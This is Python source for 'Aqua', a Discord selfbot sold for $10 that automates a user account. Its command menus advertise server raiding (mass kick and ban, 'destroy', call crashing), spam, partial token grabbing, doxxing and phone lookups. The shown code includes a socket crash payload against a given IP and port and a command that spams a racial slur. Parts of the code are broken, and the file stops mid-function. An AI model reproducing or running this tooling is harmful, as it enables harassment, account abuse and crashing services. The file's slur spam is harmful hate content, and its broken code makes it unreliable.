from typing_extensions import Self
from certifi import contents
import discord
import requests
import socket
import asyncio
import aiohttp
import random
from requests.api import request
from keyauth import api
import math
import time
import urllib.parse
import re
import base64
import logging
import colorama
import pytz
import json
import os
import io
import time
import datetime
import sys
import ctypes
import colorama
import subprocess
import string
import functools
import tkinter
import hashlib
import webbrowser
from discord.ext import commands
from discord.ext import tasks
from itertools import cycle
from datetime import datetime
from googletrans import Translator
from requests import get
from gtts import gTTS
from discord_webhook import DiscordWebhook, DiscordEmbed
from colorama import Fore
from covid import Covid
from tkinter import mainloop, messagebox
from selenium import webdriver
from pypresence import Presence
colorama.init()
version = "3.5"

client_id = '909929920778633237'  # Fake ID, put your real one here
RPC = Presence(client_id)  # Initialize the client class
RPC.connect() # Start the handshake loop
RPC.update(state="Connected", large_text="DM Dan3xo#9628", large_image="image0") # Set the presence


with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
prefix = config.get('prefix')
afk_message = config.get('afk_message')
paypalemail = config.get('paypalemail')
cashapp1 = config.get('cashapp')
instagram = config.get('instagram')
name = config.get('name')
color = config.get('embedcolor')
picture = config.get('picture')
nitro_sniper = True
nitrowebhook = config.get('nitrowebhook')
rainbowstop = ('#ff3333')
start_time = datetime.utcnow()
ip = get('https://api.ipify.org').text
start1 = "1507665886"
loop = asyncio.get_event_loop()
translator = Translator(service_urls=[
      'translate.google.com'
    ])

os.environ['discord-token'] = token
config = {
    "database": {
        "keyword": [],
        "keyword-user": [],
        "kick": 0,
        "add": [],
        "remove": [],
        "header": {"authorization": os.environ['discord-token']},
    }
}


def Clear():
    os.system('cls')
Clear()



Dan3xo = commands.Bot(command_prefix=prefix, self_bot=True)
Dan3xo.remove_command("help")
attacks = 0
def Init():
    keyauthapp = api("Aqua", "Z87QHalZKC", "d6357025b179ddecf2b347bee0fe5cd8cd96d4dc68ee83ddddd2113984c45012","1.0")
    keyauthapp.init()
    os.system("mode con cols=57 lines=18")
    print("""
\033[34m  ╔══════════════════════════════════════════════════╗
\033[34m  ║                                                  ║
\033[34m  ║                   ╔═╗┌─┐ ┬ ┬┌─┐                  ║
\033[34m  ║                   ╠═╣│─┼┐│ │├─┤                  ║
\033[34m  ║                   ╩ ╩└─┘└└─┘┴ ┴                  ║
\033[34m  ║                                                  ║
\033[34m  ║               ╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗              ║
\033[34m  ║               ╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║               ║
\033[34m  ║               ╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩               ║ 
\033[34m  ║       ╔═══════════════╦══════════════════╗       ║
\033[34m  ║       ║ 1. Login      ║   2.  Register   ║       ║
\033[34m  ║       ╠═══════════════╩══════════════════╣       ║
\033[34m  ║       ║           Made by Dan3xo         ║       ║
\033[34m  ║       ╚══════════════════════════════════╝       ║ 
\033[34m  ╚══════════════════════════════════════════════════╝
       
    """)
    xskid = input("\033[36mAqua >>")
    if xskid =="1": 
        Clear()
        user = input('Username:')
        password = input('Password:')
        try:
            keyauthapp.login(user,password)
            print("Successfull Authenticated")
            Dan3xo.run(token, bot=False, reconnect=True)

        except:
            print("Wrong info")
            time.sleep(3)
            Init()

    elif xskid =="2":
        Clear()
        user = input('Username: ')    
        password = input('Password: ')
        license = input('Key ')
        try:
            keyauthapp.register(user,password,license)
            print("Successfull Registered") 
        except:
            print("Wrong info")
            time.sleep(3)
            Init()

    else :
        print("Wrong input")
        time.sleep (3)
        Init ()

        

    #Dan3xo.run(token, bot=False, reconnect=True)



@Dan3xo.event
async def on_connect():
 guilds = len(Dan3xo.guilds)
 Clear()
 os.system("mode con cols=52 lines=19")
 ctypes.windll.kernel32.SetConsoleTitleW(f'Aqua | V {version} | Logged In As: {Dan3xo.user.name}')
 print('\033[34m╔══════════════════════════════════════════════════╗')
 print('\033[34m║                                                  ║')
 print('\033[34m║                   \033[34m╔═╗┌─┐ ┬ ┬┌─┐\033[34m                  ║')
 print('\033[34m║                   \033[34m╠═╣│─┼┐│ │├─┤\033[34m                  ║')
 print('\033[34m║                   \033[34m╩ ╩└─┘└└─┘┴ ┴\033[34m                  ║')
 print('\033[34m║                                                  ║')    
 print('\033[34m║               \033[34m╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗\033[34m              ║')
 print('\033[34m║               \033[36m╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ \033[34m              ║')
 print('\033[34m║               \033[97m╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩ \033[34m              ║')
 print('\033[34m║                  \033[97mBy: \033[37mDan3xo#\033[97m9628\033[34m                 ║')
 print('\033[34m║                                                  ║')
 print('\033[34m║                                                  ║')
 print('\033[34m║                                                  ║')
 print('\033[34m║                                                  ║')
 print('\033[34m║                                                  ║')
 print('\033[34m╚══════════════════════════════════════════════════╝')

#Dan3xo Terminal Clear Command
@Dan3xo.command()
async def cls(ctx):
    await ctx.message.delete()
    guilds = len(Dan3xo.guilds)
    Clear()
    os.system("mode con cols=52 lines=19")
    ctypes.windll.kernel32.SetConsoleTitleW(f'Aqua | V {version} | Logged In As: {Dan3xo.user.name}')
    print('\033[31m╔══════════════════════════════════════════════════╗')
    print('\033[31m║                                                  ║')
    print('\033[31m║                   \033[31m╔═╗┌─┐ ┬ ┬┌─┐\033[31m                  ║')
    print('\033[31m║                   \033[91m╠═╣│─┼┐│ │├─┤\033[31m                  ║')
    print('\033[31m║                   \033[97m╩ ╩└─┘└└─┘┴ ┴\033[31m                  ║')
    print('\033[31m║                                                  ║')       
    print('\033[31m║               \033[31m╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗\033[31m              ║')
    print('\033[31m║               \033[91m╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ \033[31m              ║')
    print('\033[31m║               \033[97m╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩ \033[31m              ║')
    print('\033[31m║                  \033[97mBy: \033[31mDan3xo#\033[97m9628\033[31m                 ║')
    print('\033[31m║                                                  ║')
    print('\033[31m║                                                  ║')
    print('\033[31m║                                                  ║')
    print('\033[31m║                                                  ║')
    print('\033[31m║                                                  ║')
    print('\033[31m╚══════════════════════════════════════════════════╝')
    print(f'\033[97m \033[31m ')

@Dan3xo.command()
async def blue(ctx):
    await ctx.message.delete()
    Clear()
    os.system("mode con cols=49 lines=17")
    ctypes.windll.kernel32.SetConsoleTitleW(f'Aqua | V {version} | Logged In As: {Dan3xo.user.name}')
    print('\033[34m╔══════════════════════════════════════════════╗')
    print('\033[34m║                                              ║')
    print('\033[34m║                 \033[34m╔═╗┌─┐ ┬ ┬┌─┐\033[34m                ║')
    print('\033[34m║                 \033[94m╠═╣│─┼┐│ │├─┤\033[34m                ║')
    print('\033[34m║                 \033[97m╩ ╩└─┘└└─┘┴ ┴\033[34m                ║')
    print('\033[34m║                                              ║')
    print('\033[34m║             \033[34m╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗\033[34m            ║')
    print('\033[34m║             \033[94m╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ \033[34m            ║')
    print('\033[34m║             \033[97m╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩ \033[34m            ║')
    print('\033[34m║                \033[97mBy: \033[34mDan3xo#\033[97m9628\033[34m               ║')
    print('\033[34m║                                              ║')
    print('\033[34m║                                              ║')
    print('\033[34m║                                              ║')
    print('\033[34m║                                              ║')
    print('\033[34m║                                              ║')
    print('\033[34m╚══════════════════════════════════════════════╝')

@Dan3xo.command()
async def cyan(ctx):
    await ctx.message.delete()
    Clear()
    os.system("mode con cols=49 lines=17")
    ctypes.windll.kernel32.SetConsoleTitleW(f'Aqua | V {version} | Logged In As: {Dan3xo.user.name}')
    print('\033[96m╔══════════════════════════════════════════════╗')
    print('\033[96m║                                              ║')
    print('\033[96m║                 \033[36m╔═╗┌─┐ ┬ ┬┌─┐\033[96m                ║')
    print('\033[96m║                 \033[96m╠═╣│─┼┐│ │├─┤\033[96m                ║')
    print('\033[96m║                 \033[97m╩ ╩└─┘└└─┘┴ ┴\033[96m                ║')
    print('\033[96m║                                              ║')
    print('\033[96m║             \033[36m╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗\033[96m            ║')
    print('\033[96m║             \033[96m╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ \033[96m            ║')
    print('\033[96m║             \033[97m╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩ \033[96m            ║')
    print('\033[96m║                \033[97mBy: \033[96mDan3xo#\033[97m9628\033[96m               ║')
    print('\033[96m║                                              ║')
    print('\033[96m║                                              ║')
    print('\033[96m║                                              ║')
    print('\033[96m║                                              ║')
    print('\033[96m║                                              ║')
    print('\033[96m╚══════════════════════════════════════════════╝')

@Dan3xo.command()
async def magenta(ctx):
    await ctx.message.delete()
    Clear()
    os.system("mode con cols=49 lines=17")
    ctypes.windll.kernel32.SetConsoleTitleW(f'Aqua | V {version} | Logged In As: {Dan3xo.user.name}')
    print('\033[95m╔══════════════════════════════════════════════╗')
    print('\033[95m║                                              ║')
    print('\033[95m║                 \033[35m╔═╗┌─┐ ┬ ┬┌─┐\033[95m                ║')
    print('\033[95m║                 \033[95m╠═╣│─┼┐│ │├─┤\033[95m                ║')
    print('\033[95m║                 \033[97m╩ ╩└─┘└└─┘┴ ┴\033[95m                ║')
    print('\033[95m║                                              ║')
    print('\033[95m║             \033[35m╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗\033[95m            ║')
    print('\033[95m║             \033[95m╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ \033[95m            ║')
    print('\033[95m║             \033[97m╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩ \033[95m            ║')
    print('\033[95m║                \033[97mBy: \033[95mDan3xo#\033[97m9628\033[95m               ║')
    print('\033[95m║                                              ║')
    print('\033[95m║                                              ║')
    print('\033[95m║                                              ║')
    print('\033[95m║                                              ║')
    print('\033[95m║                                              ║')
    print('\033[95m╚══════════════════════════════════════════════╝')

@Dan3xo.command()
async def green(ctx):
    await ctx.message.delete()
    Clear()
    os.system("mode con cols=49 lines=17")
    ctypes.windll.kernel32.SetConsoleTitleW(f'Aqua | V {version} | Logged In As: {Dan3xo.user.name}')
    print('\033[92m╔══════════════════════════════════════════════╗')
    print('\033[92m║                                              ║')
    print('\033[92m║                 \033[32m╔═╗┌─┐ ┬ ┬┌─┐\033[92m                ║')
    print('\033[92m║                 \033[92m╠═╣│─┼┐│ │├─┤\033[92m                ║')
    print('\033[92m║                 \033[97m╩ ╩└─┘└└─┘┴ ┴\033[92m                ║')
    print('\033[92m║                                              ║')
    print('\033[92m║             \033[32m╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗\033[92m            ║')
    print('\033[92m║             \033[92m╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ \033[92m            ║')
    print('\033[92m║             \033[97m╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩ \033[92m            ║')
    print('\033[92m║                \033[97mBy: \033[92mDan3xo#\033[97m9628\033[92m               ║')
    print('\033[92m║                                              ║')
    print('\033[92m║                                              ║')
    print('\033[92m║                                              ║')
    print('\033[92m║                                              ║')
    print('\033[92m║                                              ║')
    print('\033[92m╚══════════════════════════════════════════════╝')

@Dan3xo.command()
async def red(ctx):
    await ctx.message.delete()
    Clear()
    os.system("mode con cols=49 lines=17")
    ctypes.windll.kernel32.SetConsoleTitleW(f'Aqua | V {version} | Logged In As: {Dan3xo.user.name}')
    print('\033[31m╔══════════════════════════════════════════════╗')
    print('\033[31m║                                              ║')
    print('\033[31m║                 \033[31m╔═╗┌─┐ ┬ ┬┌─┐\033[31m                ║')
    print('\033[31m║                 \033[91m╠═╣│─┼┐│ │├─┤\033[31m                ║')
    print('\033[31m║                 \033[97m╩ ╩└─┘└└─┘┴ ┴\033[31m                ║')
    print('\033[31m║                                              ║')
    print('\033[31m║             \033[31m╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗\033[31m            ║')
    print('\033[31m║             \033[91m╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ \033[31m            ║')
    print('\033[31m║             \033[97m╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩ \033[31m            ║')
    print('\033[31m║                \033[97mBy: \033[31mDan3xo#\033[97m9628\033[31m               ║')
    print('\033[31m║                                              ║')
    print('\033[31m║                                              ║')
    print('\033[31m║                                              ║')
    print('\033[31m║                                              ║')
    print('\033[31m║                                              ║')
    print('\033[31m╚══════════════════════════════════════════════╝')


#Dan3xo Help Command Embed
@Dan3xo.command(pass_context=True)
async def help(beaters):
    embed = discord.Embed(title=f"***Commands***", description="**help** | Shows This Message\n**tools** | Shows List Of Tools\n**raid** | Shows List Of Raid Commands\n**fun** | Shows List Of Fun Commands\n**text** | Shows List Of Text Commands\n**mod** | Shows List Of Mod Commands\n**spammer** | Shows List Of Spammer Commands\n**cmd** | Shows List Bot Commands\n**nsfw** | Shows List Of NFSW/Gifs\n**math** | Shows Math Commands\n**user** | Shows User Commands\n**about** | Shows Info About Aqua", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m help')
    await beaters.send(embed=embed)
    await beaters.message.delete()

@Dan3xo.command(pass_context=True)
async def tools(beaters):
    embed = discord.Embed(title=f"***Tools Commands***", description="**geo** | Geo Lookups An IP\n**myip** | Shows You IP\n**ping** | Pings An IP\n**pingwebsite [URL]** | Shows If Site Is Online/Offline\n**pscan** | Port Scans An IP\n**cfres** | Resolves A Cloudflare Domain\n**tokendisable** [Token] | Disables Account\n**clearall** | Clears All Messages\n**clear [Amount]** | Clears An Amount Of Messages\n**paypal [Amount]** | PayPal Embed\n**cashapp [Amount]** | Cashapp Embed\n**yt [Name]** | Searches Top 3 Videos\n**hastebin [Text]** | Turns Text Into Hastebin\n**fnstats [Epic Name]** | Displays Stats\n**get_token [User]** | Gets Fisrt Half Of Users Token\n**emojiall** | Steals All Emojis In Every Server\n**emojisteal** | Steals That Server Emojis\n**copy** | Copys Discord Server\n", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m tools')
    await beaters.send(embed=embed)
    await beaters.message.delete()

@Dan3xo.command(pass_context=True)
async def text(beaters):
    embed = discord.Embed(title=f"***Text Commands***", description="**ascii [Message]** | Turns Message Into Ascii\n**emojify [Message]** | Turnes Message Into Emojis\n**tiny [Message]** | Turns Message Into Small Letters\n**1337-speak [Message]** | Turns Message Into 1337\n**tts [Message]** | Turns Message Into Audio File\n**embed [Message]** | Turns Message Into Embed\n**trumptweet [Message]** | Shows Text As Trumptweet", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m text')
    await beaters.send(embed=embed)
    await beaters.message.delete()

@Dan3xo.command(pass_context=True)
async def user(beaters):
    embed = discord.Embed(title=f"***Spammer Commands***", description="**info** | Gives Info Of User\n**serverinfo** | Gives Info Of Server\n**leavegroups** | Leaves All Groupchats\n**hypesquad [Squad]** | Changes Hypesquad To Choice\n**av** | Shows Users Avatar\n**read** | Reads All Unread Messages", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m spammer')
    await beaters.send(embed=embed)
    await beaters.message.delete()

@Dan3xo.command(pass_context=True)
async def mod(beaters):
    embed = discord.Embed(title=f"***Mod Commands***", description="**nuke** | Nukes Channel\n**purge [Amount]** | Clears Amount Of Messages\n**ban [User] [Reason]** | Bans User\n**kick [User] [Reason]** | Kicks User\n**Unban [Name#]** | Unbans User", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m spammer')
    await beaters.send(embed=embed)
    await beaters.message.delete()

@Dan3xo.command(pass_context=True)
async def spammer(beaters):
    embed = discord.Embed(title=f"***Spammer Commands***", description="**spam [Amount] [Message]** | Spams Message Amount Of Times\n**massspam [Message]** | Spams Message 200 Times\n**advertise [Message]** | DMs Everyone In Server With 2 Minute Timer\n**dmall [Message]** | Sends To Everyone Instantly (Use On ALT)\n**massreact [Emoji]** | Reacts To 50 Messages\n**react [Amount] [Emoji]** | Reacts To Amount Of Messages\n**spamuser [@User] [Message]** | Spams Message To User 10 Times Then Deletes", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m spammer')
    await beaters.send(embed=embed)
    await beaters.message.delete()

@Dan3xo.command()
async def botinfo(ctx):
  uptime = datetime.utcnow() - start_time
  uptime = str(uptime).split('.')[0]
  embed = discord.Embed(title=f"***Bot Info***", description=f"**Logged In As** {Dan3xo.user.name}\n**Servers** {len(Dan3xo.guilds)}\n**Friends** {len(list(Dan3xo.user.friends))}\n**Prefix** {prefix}\n**Embed Color** #{color}\n**Version** 2.8\n**Uptime** {uptime}", color=discord.Color(int(color, 16)))  
  embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
  embed.set_thumbnail(url=Dan3xo.user.avatar_url)
  print('\033[97mCommand Used |\033[31m botinfo')
  await ctx.message.delete()
  await ctx.send(embed=embed)

@Dan3xo.command()
async def about(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title=f"***Aqua Selfbot By Dan3xo***", description="**Dan3xo Selfbot** Is A Easy To Use Selfbot Thats Made To Make Your Discord Experience Better, For More Questions DM Me **Dan3xo#9628 **, **Aqua** Is Only $10 USD And We Have Most Payment Methods.", color=discord.Color(int(color, 16)))
    embed.add_field(name=f"**Version:**", value=f"{version}")
    embed.add_field(name=f"**Owner:**", value=f"Dan3xo#9628")
    embed.add_field(name=f"**Server:**", value=f"[**Invite Link**]()none")
    embed.add_field(name=f"**Payment Methods:**", value=f"Paypal, Cashapp, Venmo, BTC")
    embed.set_image(url='https://media.discordapp.net/attachments/912131523220758558/915794891844513892/KellyVPN.gif')
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m about')
    await ctx.send(embed=embed)

@Dan3xo.command(pass_context=True)
async def cmd(beaters):
    embed = discord.Embed(title=f"***Bot Commands***", description="**dmlogger** | Toggles Logger On/Off\n**afk** | Toggles Afk Message On/Off\n**cls** | Clears Terminal\n**reboot** | Reboots Selfbot\n**close** | Closes Selfbot\n**uptime** | Shows Selfbots Uptime\n**noleave** | Instantly Adds Users In Group After Removed\n**allowleave** | Removes User From The noleave List\n**botinfo** | Shows Client Info\n**cyan** | Changes To Cyan Color\n**red** | Changes To Red Color\n**green** | Changes To Green Color\n**blue** | Changes To Blue Color\n**magenta** | Changes To Magenta Color", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m cmd')
    await beaters.message.delete()
    await beaters.send(embed=embed)

@Dan3xo.command(pass_context=True)
async def nsfw(beaters):
    embed = discord.Embed(title=f"***Gifs/NSFW Commands***", description="**slap** | Slaps A User\n**kiss** | Kisses A User\n**hug** | Hugs A User\n**cuddle** | Cuddles A User\n**tickle** | Tickles A User\n**pat** | Pats A User\n**kill** | Kills A User\n**sad** | Sad Gif\n**anal** | Anal Gif\n**blowjob** | Blowjob Gif\n**boobs** | Boob Gif\n**meme** | Random Memes\n**realboobs** | Shows Real Boobs\n**realass** | Shows Real Ass", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m gifs')
    await beaters.message.delete()
    await beaters.send(embed=embed) 


@Dan3xo.command(pass_context=True)
async def math(beaters):
    embed = discord.Embed(title=f"***Math Commands***", description="**add [Num1] [Num2]** | Adds The 2 Numbers\n**subtract [Num1] [Num2]** | Subtracts The 2 Numbers\n**divide [Num1] [Num2]** | divides The 2 Numbers\n**multiply [Num1] [Num2]** | Multiplys The 2 Numbers ", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m math')
    await beaters.message.delete()
    await beaters.send(embed=embed)

@Dan3xo.command(pass_context=True)
async def raid(beaters):
    embed = discord.Embed(title=f"***Raid Commands***", description="**kickall** | Kicks Everyone Out Of Server\n**banall** | Bans Everyone Out Of Server\n**cbomb** | Crashes Call (DM AND GROUP)\n**phone** | Spam Rings\n**toxic** | Makes Big Blank Message\n**destroy** | Destroys The Server\n**blank** | Makes Whole Server Blank\n**ghost [@user]** | Ghost Pings A User\n**annoy [User] [Amount]** | Pings Someone Every 6 Seconds", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m raid')
    await beaters.send(embed=embed)
    await beaters.message.delete()

@Dan3xo.command(pass_context=True)
async def fun(beaters):
    embed = discord.Embed(title=f"***Fun Commands***", description="**dick** | Shows Users Dick Size\n**gay** | Shows How Gay User Is\n**simp** | Shows How Simp A User Is\n**bw** | BubbleWrap\n**combine [Name1] [Name2]** | Combines 2 Names\n**slots** | Plays Slot Machines\n**magic8ball [Question]** | Ask 8ball A Question\n**translate [Message]** | Translates Message To English\n**rainbow [Role Name]** | Toggles Rainbow Role On/Off\n**btc** | Shows Current Bitcoin Worth\n**joke** | Tells A Joke\n**poll [Question]** | Makes A Poll\n**dox [User]** | Info Sent To DM Troll\n**nitro** | Randomly Generates A Nitro Code\n**insult [User]** | Insults A User\n**yesorno [Question]** | Answers Yes Or No\n**thotrate [User]** | Shows Users Thotness\n**ship [User] [User2]** | Shows Relationship Of Users\n**wasted [User]** | Puts Wasted Over User Pfp", color=discord.Color(int(color, 16)))
    embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
    print('\033[97mCommand Used |\033[31m fun')
    await beaters.message.delete()
    await beaters.send(embed=embed)



#Dan3xo Bubble Wrap Lel
@Dan3xo.command(pass_context=True)
async def bw(beaters):
    await beaters.send("\n".join(["Heres Some Bubble Wrap :heart:\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||||Nigger||\r"]))
    print('\033[97mCommand Used |\033[31m bw')
    await beaters.message.delete()

@Dan3xo.command()
async def myip(ctx):
 print('\033[97mCommand Used |\033[31m myip')
 embed = discord.Embed(title="***My IP***", description=f"IP: ``{ip}``", color=discord.Color(int(color, 16)))
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 await ctx.send(embed=embed)
 await ctx.message.delete()

@Dan3xo.command(name='glitch-ping')
async def gping(ctx, *, message):
  await ctx.message.delete()
  lel = await ctx.send(f'''
    {message}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|||||||||||| https://@everyone@google.com/
    ''')







@Dan3xo.command()
async def get_token(ctx, *, user: discord.Member):
 print('\033[97mCommand Used |\033[31m get_token')
 message = f"{user.id}"
 message_bytes = message.encode('ascii')
 base64_bytes = base64.b64encode(message_bytes)
 base64_message = base64_bytes.decode('ascii')
 embed = discord.Embed(title="***Token***", description=f"{user.mention}\n``{base64_message}``", color=discord.Color(int(color, 16)))
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 await ctx.send(embed=embed)
 await ctx.message.delete()

def MiraiCrash(ip,port):
    payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$(*£&(*&$^*(^£*&)((*&)(*&()))))" * 25
    s = socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(payload.encode())
    s.close()

@Dan3xo.command(aliases=["miraibrute"])
async def MiraiBruteCmd(ctx, ip):
 await ctx.send('')
 try:
    ip = ip
    mainloop.MiraiBrute(ip)
 except:
       await ctx.send("`Mirai Brute Failed.`")


@Dan3xo.command()
async def phonelookup(ctx, phone):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/phonelookup?key=&number={phone}").text
    embed=discord.Embed(title=f" __**Info On {phone}**__ ", description=f"{r}", color=0xff0000)
    await ctx.send(embed=embed)

@Dan3xo.command()
async def thotrate(ctx, *, user: discord.Member):
 print('\033[97mCommand Used |\033[31m thotrate')
 les = random.randint(0, 100)
 embed = discord.Embed(
     description="{} is a **{}**% thot.".format(user.mention, str(les)),
     color=discord.Color(int(color, 16)))
 embed.set_author(name="{}".format(ctx.message.author), icon_url=ctx.message.author.avatar_url)
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 embed.set_thumbnail(url=user.avatar_url)
 await ctx.send(embed=embed)


@Dan3xo.command()
async def ship(ctx, user: discord.Member, user2: discord.Member):
 await ctx.message.delete()
 print('\033[97mCommand Used |\033[31m ship')
 percent = random.randint(0, 100)
 strr = " "
 if percent >= 0 and percent <= 10:
     strr = "horrible"
 if percent >= 11 and percent <= 20:
     strr = "very bad"
 if percent >= 21 and percent <= 30:
     strr = "bad"
 if percent >= 31 and percent <= 40:
     strr = "worse than avarage"
 if percent >= 41 and percent <= 50:
     strr = "avarage"
 if percent >= 51 and percent <= 60:
     strr = "better than avarage"
 if percent == 69:
     strr = ":wink:"
 if percent >= 61 and percent <= 68:
     strr = "good"
 if percent == 70:
     strr = "good"
 if percent >= 71 and percent <= 80:
     strr = "very good"
 if percent >= 81 and percent <= 90:
     strr = "almost perfect"
 if percent >= 91 and percent <= 100:
     strr = "amazing"
 embed = discord.Embed(title=":two_hearts:  MATCHMAKING: :two_hearts: ", description="**{}** :heart: **{}**\n\n**{}%**! That's **{}**.".format(user.name, user2.name,str(percent), strr), color=discord.Color(int(color, 16)))
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 await ctx.send(embed=embed)

#Dan3xo Ipinfo.io Geo Lookup Embed
@Dan3xo.command(pass_context=True)
async def geo(ctx,ip):
 print('\033[97mCommand Used |\033[31m geo')
 await ctx.message.delete()
 gay = get("http://ip-api.com/json/%s?fields=65535" % ip)
 ipjson = gay.json()
